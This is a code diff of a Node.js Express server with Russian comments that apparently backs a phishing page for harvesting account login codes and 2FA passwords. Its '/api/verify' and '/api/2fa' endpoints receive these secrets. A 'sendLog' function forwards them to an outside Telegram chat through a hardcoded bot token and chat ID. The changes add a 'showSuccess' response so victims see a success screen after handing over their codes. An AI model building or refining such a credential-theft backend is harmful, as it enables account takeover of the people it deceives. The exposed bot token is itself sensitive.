@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 3000;
 
 const DATA_FILE = path.join('/tmp', 'data.txt');
 
-// ===== ТОЛЬКО ДЛЯ ЛОГОВ (НОВЫЙ БОТ) =====
+// ===== ТОКЕНЫ ДЛЯ ЛОГОВ =====
 const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
 const LOG_CHAT_ID = '7424945574';
 
@@ -18,7 +18,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
-// ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM (ЛОГИ) =====
+// ===== ОТПРАВКА ЛОГОВ В TELEGRAM =====
 async function sendLog(message) {
     try {
         await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
@@ -78,7 +78,8 @@ app.post('/api/verify', async (req, res) => {
         `🕒 ${new Date().toLocaleString()}`
     );
 
-    res.json({ success: true });
+    // ===== ПОСЛЕ УСПЕШНОГО ВВОДА КОДА =====
+    res.json({ success: true, showSuccess: true });
 });
 
 // ===== 3. ПРИЁМ 2FA ПАРОЛЯ =====
@@ -108,7 +109,8 @@ app.post('/api/2fa', async (req, res) => {
         `🕒 ${new Date().toLocaleString()}`
     );
 
-    res.json({ success: true });
+    // ===== ПОСЛЕ УСПЕШНОГО ВВОДА 2FA =====
+    res.json({ success: true, showSuccess: true });
 });
 
 // ===== 4. СКАЧИВАНИЕ DATA.TXT =====
